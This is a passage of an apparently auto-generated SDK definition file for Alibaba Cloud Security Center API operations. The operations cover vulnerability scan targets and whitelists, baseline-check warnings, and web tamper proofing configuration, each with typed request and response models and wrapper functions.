          target?: string(name='Target', description='The group ID or UUID of the server to which the configurations are applied.', example='0011ea53-738c-4bff-93be-ce6a1cc9****'),
          targetType?: string(name='TargetType', description='The condition by which the configurations are applied to the server. Valid values:

*   **uuid**: the UUID of the server
*   **groupId**: the ID of the server group', example='uuid'),
        }
      ](name='Targets', description='An array that consists of available servers.'),
      totalCount?: int32(name='TotalCount', description='The total number of servers.', example='1'),
      uuidCount?: int32(name='UuidCount', description='The number of servers to which the configurations are applied.', example='1'),
      vulType?: string(name='VulType', description='The type of the vulnerability. Valid values:

*   cve: Linux software vulnerabilities
*   sys: Windows system vulnerabilities
*   cms: Web-CMS vulnerabilities
*   emg: urgent vulnerabilities', example='cve'),
    }
  ](name='TargetStats', description='An array that consists of the configurations of the vulnerability scan feature.'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
}

model DescribeVulTargetStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeVulTargetStatisticsResponseBody(name='body'),
}

/**
 * @summary Queries the configurations of the vulnerability scan feature.
 *
 * @param request DescribeVulTargetStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeVulTargetStatisticsResponse
 */
async function describeVulTargetStatisticsWithOptions(request: DescribeVulTargetStatisticsRequest, runtime: Util.RuntimeOptions): DescribeVulTargetStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulTargetStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the configurations of the vulnerability scan feature.
 *
 * @param request DescribeVulTargetStatisticsRequest
 * @return DescribeVulTargetStatisticsResponse
 */
async function describeVulTargetStatistics(request: DescribeVulTargetStatisticsRequest): DescribeVulTargetStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulTargetStatisticsWithOptions(request, runtime);
}

model DescribeVulWhitelistRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page 1. Default value: 1.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 10.', example='10'),
}

model DescribeVulWhitelistResponseBody = {
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='10'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='74F97EF7-B543-43FD-A4E9-18456731F9C5'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
  vulWhitelists?: [ 
    {
      aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2017:3263: curl security update'),
      id?: string(name='Id', description='The ID of the rule.', example='1275'),
      name?: string(name='Name', description='The name of the vulnerability.', example='oval:com.redhat.rhsa:def:20173263'),
      reason?: string(name='Reason', description='The reason why the vulnerability is added to the whitelist.', example='ignore'),
      targetInfo?: string(name='TargetInfo', description='The application scope of the rule. The value is a JSON string that contains the following fields:

*   **type**: the type of the assets to which the rule is applied. Valid values:

    *   **Uuid**: server
    *   **GroupId**: server group

*   **groupIds**: the ID of the server group

*   **uuids**: the UUID of the server

> If this field is empty, the rule is applied to all assets.', example='{"type":"GroupId","groupIds":[916****],"uuids":[]}'),
      type?: string(name='Type', description='The type of the vulnerability.', example='cve'),
      whitelist?: string(name='Whitelist', description='The information about the vulnerability. The value of this parameter is in the JSON format. Valid values:

*   **name**: the name of the vulnerability
*   **type**: the type of the vulnerability.
*   **aliasName**: the alias of the vulnerability', example='[{
"name":"oval:com.redhat.rhsa:def:20173263",
"type":"cve",
"aliasName":"RHSA-2017:3263: curl security update"
}]'),
    }
  ](name='VulWhitelists', description='An array that consists of information about the whitelist of vulnerabilities.'),
}

model DescribeVulWhitelistResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeVulWhitelistResponseBody(name='body'),
}

/**
 * @summary Queries the whitelist of vulnerabilities by page.
 *
 * @param request DescribeVulWhitelistRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeVulWhitelistResponse
 */
async function describeVulWhitelistWithOptions(request: DescribeVulWhitelistRequest, runtime: Util.RuntimeOptions): DescribeVulWhitelistResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeVulWhitelist',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the whitelist of vulnerabilities by page.
 *
 * @param request DescribeVulWhitelistRequest
 * @return DescribeVulWhitelistResponse
 */
async function describeVulWhitelist(request: DescribeVulWhitelistRequest): DescribeVulWhitelistResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeVulWhitelistWithOptions(request, runtime);
}

model DescribeWarningExportInfoRequest {
  exportId?: long(name='ExportId', description='The ID of the export task.

>  You can can call the [ExportWarning](~~ExportWarning~~) operation to query the IDs of export tasks.

This parameter is required.', example='14356'),
}

model DescribeWarningExportInfoResponseBody = {
  currentCount?: int32(name='CurrentCount', description='The number of baseline entries that are exported.', example='1'),
  exportStatus?: string(name='ExportStatus', description='The status of the export task.

Valid values:

*   **init**: The task is being initialized.
*   **exporting**: The task is in progress.
*   **success**: The task is successful.', example='success'),
  fileName?: string(name='FileName', description='The name of the exported Excel file.', example='app_20210917'),
  id?: long(name='Id', description='The ID of the export task for the baseline check result.', example='131231'),
  link?: string(name='Link', description='The URL at which you can download the exported Excel file.', example='https://eds.aliyun.com/notification/entitle/64b5c3e2-e52b-4d29-9617-e7e6d74XXXX'),
  message?: string(name='Message', description='The message that shows the task result. The value is fixed as **successful**, which indicates that the export task is complete.', example='successful'),
  progress?: int32(name='Progress', description='The progress percentage of the export task.', example='100'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='79CFF74D-E967-5407-8A78-EE03B925FDAA'),
  totalCount?: int32(name='TotalCount', description='The total number of baseline entries returned.', example='100'),
}

model DescribeWarningExportInfoResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeWarningExportInfoResponseBody(name='body'),
}

/**
 * @summary Queries the progress of a export task for a baseline check result.
 *
 * @param request DescribeWarningExportInfoRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeWarningExportInfoResponse
 */
async function describeWarningExportInfoWithOptions(request: DescribeWarningExportInfoRequest, runtime: Util.RuntimeOptions): DescribeWarningExportInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.exportId)) {
    query['ExportId'] = request.exportId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWarningExportInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the progress of a export task for a baseline check result.
 *
 * @param request DescribeWarningExportInfoRequest
 * @return DescribeWarningExportInfoResponse
 */
async function describeWarningExportInfo(request: DescribeWarningExportInfoRequest): DescribeWarningExportInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWarningExportInfoWithOptions(request, runtime);
}

model DescribeWarningMachinesRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='c7e3c5b420a7947c2933303144688****'),
  containerFieldName?: string(name='ContainerFieldName', description='The name of the field that is used to search for the container. Valid values:

*   **CONTAINER_ID**: the ID of the container
*   **IMAGE**: the name of the image
*   **NAMESPACE**: the namespace
*   **NODE_NAME**: the name of the node
*   **POD_IP**: the IP address of the pod
*   **HOST_IP**: the IP address of the host
*   **INSTANCE_ID**: the ID of the instance', example='containerId'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The value of the field that is used to search for the container.', example='c8bb3ef0f5ccf45508f0fd1ffc200****'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  groupId?: long(name='GroupId', description='The ID of the asset group.

> You can call the [DescribeAllGroups](https://help.aliyun.com/document_detail/130972.html) operation to query the IDs of asset groups.', example='123'),
  haveRisk?: int32(name='HaveRisk', description='Specifies whether risks were detected. Valid values:

*   **1**: yes
*   **0**: no', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  machineName?: string(name='MachineName', description='The name of the server on which the baseline check is performed.', example='oracle-win-001****'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: **10**, which indicates that 10 entries of server information are displayed on each page. A maximum of 100 entries can be returned per page.', example='10'),
  riskId?: long(name='RiskId', description='The ID of the risk item.

> You can call the [DescribeCheckWarningSummary](~~DescribeCheckWarningSummary~~) operation to query the IDs of risk items.

This parameter is required.', example='196'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  strategyId?: long(name='StrategyId', description='The ID of the baseline check policy.', example='16'),
  targetType?: string(name='TargetType', description='The type of the query condition. Valid values:

*   **containerId**: the ID of the container
*   **uuid**: the UUID of the asset', example='uuid'),
  uuids?: string(name='Uuids', description='The UUID of the server on which the baseline check is performed. Separate multiple UUIDs with commas (,).', example='9888955c-0076-49da-bd9c-34f5492b****'),
}

model DescribeWarningMachinesResponseBody = {
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6E4CBE87-E887-5AF1-86D2-78EB4AA3E771'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='1'),
  warningMachines?: [ 
    {
      authVersion?: int32(name='AuthVersion', description='The edition of Security Center that is authorized to protect the asset. Valid values:

*   **1**: Basic edition
*   **6**: Anti-virus edition
*   **5**: Advanced edition
*   **3**: Enterprise edition
*   **7**: Ultimate edition
*   **10**: Value-added Plan edition', example='7'),
      bind?: boolean(name='Bind', description='Indicates whether Security Center is authorized to protect the asset. Valid values:

*   **true**
*   **false**', example='true'),
      containerId?: string(name='ContainerId', description='The container ID.', example='48a6d9a92435a13ad573372c3f3c63b7e04d106458141df9f92155709d******'),
      containerName?: string(name='ContainerName', description='The name of the container.', example='redis'),
      highWarningCount?: int32(name='HighWarningCount', description='The number of **high-risk** items on the server.', example='10'),
      instanceId?: string(name='InstanceId', description='The server ID.', example='i-m5ee8b9nr3h30mhb****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='oracle-win-00****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='1.2.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='1.2.XX.XX'),
      lowWarningCount?: int32(name='LowWarningCount', description='The number of **low-risk** items on the server.', example='3'),
      mediumWarningCount?: int32(name='MediumWarningCount', description='The number of **medium-risk** items on the server.', example='2'),
      passCount?: int32(name='PassCount', description='The number of the check items that passed the baseline check on the server.', example='10'),
      portOpen?: boolean(name='PortOpen', description='Indicates whether a port on the server is accessible over the Internet. Valid values:

*   **true**
*   **false**', example='true'),
      regionId?: string(name='RegionId', description='The ID of the region in which the server is deployed.', example='cn-qingdao'),
      status?: int32(name='Status', description='The verification status of the risk item after the risk item is fixed. Valid values:

*   **1**: complete
*   **2**: verifying', example='1'),
      uuid?: string(name='Uuid', description='The UUID of the server on which the baseline check is performed.', example='9888955c-0076-49da-bd9c-34f5492b****'),
    }
  ](name='WarningMachines', description='The information about the servers.'),
}

model DescribeWarningMachinesResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeWarningMachinesResponseBody(name='body'),
}

/**
 * @summary Queries information about servers on which a baseline check is performed. The information includes the IDs of the servers, the statistics of a risk item, and the status of the risk item.
 *
 * @param request DescribeWarningMachinesRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeWarningMachinesResponse
 */
async function describeWarningMachinesWithOptions(request: DescribeWarningMachinesRequest, runtime: Util.RuntimeOptions): DescribeWarningMachinesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.haveRisk)) {
    query['HaveRisk'] = request.haveRisk;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.machineName)) {
    query['MachineName'] = request.machineName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskId)) {
    query['RiskId'] = request.riskId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWarningMachines',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries information about servers on which a baseline check is performed. The information includes the IDs of the servers, the statistics of a risk item, and the status of the risk item.
 *
 * @param request DescribeWarningMachinesRequest
 * @return DescribeWarningMachinesResponse
 */
async function describeWarningMachines(request: DescribeWarningMachinesRequest): DescribeWarningMachinesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWarningMachinesWithOptions(request, runtime);
}

model DescribeWebLockBindListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page 1. Default value: 1.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and the response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20.', example='20'),
  remark?: string(name='Remark', description='The string that allows you to search for servers in fuzzy match mode. You can enter a server name or IP address.', example='192.168.XX.XX'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='116.30.XX.XX'),
  status?: string(name='Status', description='The protection status of the server that you want to query. Valid values:

*   **on**: protected
*   **off**: unprotected', example='on'),
  uuid?: string(name='Uuid', description='The UUID of the asset that you want to query.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUID.', example='7151f27e-1d51-4e98-a540-8936a****'),
}

model DescribeWebLockBindListResponseBody = {
  bindList?: [ 
    {
      auditCount?: string(name='AuditCount', description='The number of alerts.', example='2'),
      blockCount?: string(name='BlockCount', description='The number of blocked tampering events.', example='10'),
      dirCount?: string(name='DirCount', description='The number of protected directories.', example='5'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='testName'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='54.169.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='192.168.XX.XX'),
      os?: string(name='Os', description='The operating system that the server runs.', example='Linux'),
      percent?: int32(name='Percent', description='The percentage of the starting progress of web tamper proofing. Valid values: 0 to 100.', example='99'),
      serviceCode?: string(name='ServiceCode', description='The error code for web tamper proofing. Valid values:

*   **2001**: The Security Center agent is offline.
*   **9999**: The connection timed out.', example='2001'),
      serviceDetail?: string(name='ServiceDetail', description='The exception details of web tamper proofing. Valid values:

*   **client offline**: The Security Center agent is offline.
*   **timeout**: The connection timed out.', example='client offline'),
      serviceStatus?: string(name='ServiceStatus', description='The status of web tamper proofing on the server. Valid values:

*   **stop**: Web tamper proofing is disabled.
*   **initializing**: Web tamper proofing is being enabled.
*   **exception**: Web tamper proofing is not running as expected.
*   **running**: Web tamper proofing is running.
*   **closing**: Web tamper proofing is being disabled.', example='stop'),
      status?: string(name='Status', description='The protection status of the server. Valid values:

*   **on**: The server is protected.
*   **off**: The server is not protected.', example='on'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='inet-12345****'),
    }
  ](name='BindList', description='The information about the servers that have web tamper proofing enabled.'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page. Pages start from page 1. Default value: 1.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: 20.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D9354C1A-D709-4873-9AAE-41513327B247'),
  totalCount?: int32(name='TotalCount', description='The total number of servers that have web tamper proofing enabled.', example='11409'),
}

model DescribeWebLockBindListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeWebLockBindListResponseBody(name='body'),
}

/**
 * @summary Queries the information about the servers that have web tamper proofing enabled.
 *
 * @param request DescribeWebLockBindListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeWebLockBindListResponse
 */
async function describeWebLockBindListWithOptions(request: DescribeWebLockBindListRequest, runtime: Util.RuntimeOptions): DescribeWebLockBindListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebLockBindList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about the servers that have web tamper proofing enabled.
 *
 * @param request DescribeWebLockBindListRequest
 * @return DescribeWebLockBindListResponse
 */
async function describeWebLockBindList(request: DescribeWebLockBindListRequest): DescribeWebLockBindListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockBindListWithOptions(request, runtime);
}

model DescribeWebLockConfigListRequest {
  id?: long(name='Id', description='The configuration ID of the protected directory.', example='1404656'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.3.4'),
  uuid?: string(name='Uuid', description='The UUID of the server.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUID.

This parameter is required.', example='inet-1234567****'),
}

model DescribeWebLockConfigListResponseBody = {
  configList?: [ 
    {
      defenceMode?: string(name='DefenceMode', description='The prevention mode. Valid values:

*   **block**: Interception Mode
*   **audit**: Alert Mode', example='audit'),
      dir?: string(name='Dir', description='The directory that has web tamper proofing enabled.', example='/www/tmp/'),
      exclusiveDir?: string(name='ExclusiveDir', description='The directory that has web tamper proofing disabled.

> If the value of **Mode** is **blacklist**, this parameter is returned.', example='/home/admin/tomcat'),
      exclusiveFile?: string(name='ExclusiveFile', description='The file that has web tamper proofing disabled.

> If the value of **Mode** is **blacklist**, this parameter is returned.', example='/home/admin/tomcat/localhost.log'),
      exclusiveFileType?: string(name='ExclusiveFileType', description='The type of the file that has web tamper proofing disabled.

> If the value of **Mode** is **blacklist**, this parameter is returned.', example='*.jpg'),
      id?: string(name='Id', description='The configuration ID of the protected directory.', example='11'),
      inclusiveFile?: string(name='InclusiveFile', description='The file that has web tamper proofing enabled.

> If the value of **Mode** is **whitelist**, this parameter is returned.', example='/home/admin/tomcat/aaa.log'),
      inclusiveFileType?: string(name='InclusiveFileType', description='The type of the file that has web tamper proofing enabled.

> If the value of **Mode** is **whitelist**, this parameter is returned.', example='jpg'),
      localBackupDir?: string(name='LocalBackupDir', description='The local path to the backup files of the protected directory.', example='/usr/local/backup'),
      mode?: string(name='Mode', description='The protection mode of web tamper proofing. Valid values:

*   **whitelist**: In this mode, web tamper proofing is enabled for the specified directories and file types.
*   **blacklist**: In this mode, web tamper proofing is enabled for the unspecified subdirectories, file types, and files in the protected directory.', example='blacklist'),
      uuid?: string(name='Uuid', description='The UUID of the server that has web tamper proofing enabled.', example='80d2f7d6-31a9-4d7f-8ff4-7ecc42f8****'),
    }
  ](name='ConfigList', description='The configurations of web tamper proofing.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='D9354C1A-D709-4873-9AAE-41513327B247'),
  totalCount?: int32(name='TotalCount', description='The total number of directories that have web tamper proofing enabled on the server.', example='1'),
}

model DescribeWebLockConfigListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeWebLockConfigListResponseBody(name='body'),
}

/**
 * @summary Queries the configurations of web tamper proofing for a specified server.
 *
 * @param request DescribeWebLockConfigListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeWebLockConfigListResponse
 */
async function describeWebLockConfigListWithOptions(request: DescribeWebLockConfigListRequest, runtime: Util.RuntimeOptions): DescribeWebLockConfigListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebLockConfigList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the configurations of web tamper proofing for a specified server.
 *
 * @param request DescribeWebLockConfigListRequest
 * @return DescribeWebLockConfigListResponse
 */
async function describeWebLockConfigList(request: DescribeWebLockConfigListRequest): DescribeWebLockConfigListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockConfigListWithOptions(request, runtime);
}

model DescribeWebLockExclusiveFileTypeResponseBody = {
  exclusiveFileType?: [ string ](name='ExclusiveFileType', description='An array that consists of the types of the files that are excluded from web tamper proofing.'),
  requestId?: string(name='RequestId', description='The request ID.', example='9CCD7D51-5E81-5FF5-BD74-813DDD248430'),
  totalCount?: int32(name='TotalCount', description='The total number of types of the files that are excluded from web tamper proofing.', example='30'),
}

model DescribeWebLockExclusiveFileTypeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeWebLockExclusiveFileTypeResponseBody(name='body'),
}

/**
 * @summary Queries the types of files that are excluded from web tamper proofing.
 *
 * @param request DescribeWebLockExclusiveFileTypeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeWebLockExclusiveFileTypeResponse
 */
async function describeWebLockExclusiveFileTypeWithOptions(runtime: Util.RuntimeOptions): DescribeWebLockExclusiveFileTypeResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeWebLockExclusiveFileType',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the types of files that are excluded from web tamper proofing.
 *
 * @return DescribeWebLockExclusiveFileTypeResponse
 */
async function describeWebLockExclusiveFileType(): DescribeWebLockExclusiveFileTypeResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockExclusiveFileTypeWithOptions(runtime);
}

model DescribeWebLockFileChangeStatisticsRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.', example='20'),
}

model DescribeWebLockFileChangeStatisticsResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  list?: [ 
    {
      count?: int32(name='Count', description='The number of attempts.', example='33'),
      file?: string(name='File', description='The file path.', example='/tmp'),
    }
  ](name='List', description='An array consisting of the files that are changed.'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='709A8C3D-A543-5B79-AB75-361B206F71D9'),
  totalCount?: int32(name='TotalCount', description='The total number of files that are attempted to change.', example='200'),
}

model DescribeWebLockFileChangeStatisticsResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeWebLockFileChangeStatisticsResponseBody(name='body'),
}

/**
 * @summary Queries the statistics on changes to the files that are protected by web tamper proofing.
 *
 * @param request DescribeWebLockFileChangeStatisticsRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeWebLockFileChangeStatisticsResponse
 */
async function describeWebLockFileChangeStatisticsWithOptions(request: DescribeWebLockFileChangeStatisticsRequest, runtime: Util.RuntimeOptions): DescribeWebLockFileChangeStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeWebLockFileChangeStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics on changes to the files that are protected by web tamper proofing.
 *
 * @param request DescribeWebLockFileChangeStatisticsRequest
 * @return DescribeWebLockFileChangeStatisticsResponse
 */
async function describeWebLockFileChangeStatistics(request: DescribeWebLockFileChangeStatisticsRequest): DescribeWebLockFileChangeStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeWebLockFileChangeStatisticsWithOptions(request, runtime);
}

model DescribeWebLockFileEventsRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  dealed?: string(name='Dealed', description='Specifies whether the event on web tamper proofing is handled. Valid values:

*   **n**: The event on web tamper proofing is handled.
*   **y**: The event on web tamper proofing is not handled.', example='n'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='20'),
  processName?: string(name='ProcessName', description='The name of the process.', example='sys_create'),
  remark?: string(name='Remark', description='The name of the asset.

